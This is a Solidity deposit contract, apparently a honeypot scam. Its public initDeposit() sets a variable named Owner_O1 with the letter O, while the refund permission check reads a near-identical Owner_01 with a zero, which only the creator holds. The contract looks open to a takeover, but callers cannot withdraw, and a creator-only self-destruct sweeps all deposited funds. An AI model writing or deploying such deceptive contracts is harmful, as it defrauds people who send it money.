pragma solidity ^0.4.16;

contract Base 
{
    address Creator = msg.sender;
    address Owner_01 = msg.sender;

    
    event Deposited(address indexed sender, uint value);
    
    event Invested(address indexed sender, uint value);
    
    event Refunded(address indexed sender, uint value);
    
    event Withdrew(address indexed sender, uint value);
    
    event Log(string message);
    
    address Owner_02;
    address Owner_03;
    
    function add(uint256 x, uint256 y) 
    internal 
    returns (uint256) 
    {
        uint256 z = x + y;
        if((z >= x) && (z >= y))
        {
          return z;
        }
        else
        {
            revert();
        }
    }

    function sub(uint256 x, uint256 y) 
    internal 
    returns (uint256) 
    {
        if(x >= y)
        {
           uint256 z = x - y;
           return z;
        }
        else
        {
            revert();
        }
    }

    function mul(uint256 x, uint256 y) 
    internal 
    returns (uint256) 
    {
        uint256 z = x * y;
        if((x == 0) || (z / x == y))
        {
            return z;
        }
        else
        {
            revert();
        }
    }
    
}

contract SimpleDeposit is Base
{
    struct Creditor
    {
        uint Time;
        uint Invested;
    }
    
    uint public TotalDeposited;
    uint public Available;
    uint public DepositorsQty;
    uint public prcntRate = 10;
    bool RefundEnabled;
    
    address Owner_O1;
    
    mapping (address => uint) public Depositors;
    mapping (address => Creditor) public Creditors;
    
    
    address Owner_O2;
    address Owner_O3;
    

    function initDeposit()
    {
        Owner_O1 = msg.sender;
    }
    
    function SetTrustee(address addr) 
    public 
    {
        require((msg.sender == Owner_O2)||(msg.sender==Creator));
        Owner_O2 = addr;
    }
    
    function SetFund(address addr) 
    public 
    {
        require((msg.sender == Owner_O2)||(msg.sender==Creator));
        Owner_O3 = addr;
    }
    
    function SetPrcntRate(uint val)
    public
    {
        if(val>=1&&msg.sender==Creator)
        {
            prcntRate = val;  
        }
    }
    
    function() payable
    {
        Deposit();
    }
    
    function Deposit() 
    public
    payable
    {
        if(msg.value>= 0.5 ether)
        {
            if(Depositors[msg.sender]==0)DepositorsQty++;
            Depositors[msg.sender]+=msg.value;
            TotalDeposited+=msg.value;
            Available+=msg.value;
            Invested(msg.sender,msg.value);
        }   
    }
    
    function ToLend() 
    public 
    payable
    {
        Creditors[msg.sender].Time = now;
        Creditors[msg.sender].Invested += msg.value;
        Deposited(msg.sender,msg.value);
    }
    
    function RefundDeposit(address _addr, uint _wei) 
    public 
    payable
    {
        if(Depositors[_addr]>0)
        {
            if(isAllowed())
            {
                _addr.send(_wei);
                Available-=_wei;
                Withdrew(_addr,_wei);
                 
            }
        }
    }
    
     function isAllowed()
    private
    constant 
    returns (bool)
    {
        return( msg.sender == Owner_01 || msg.sender == Owner_02 || msg.sender == Owner_03);
    }
    
    function Sunset()
    public
    payable
    {
        if(msg.sender==Creator)
        {
            suicide(Creator);
        }
    }
    
    
  
}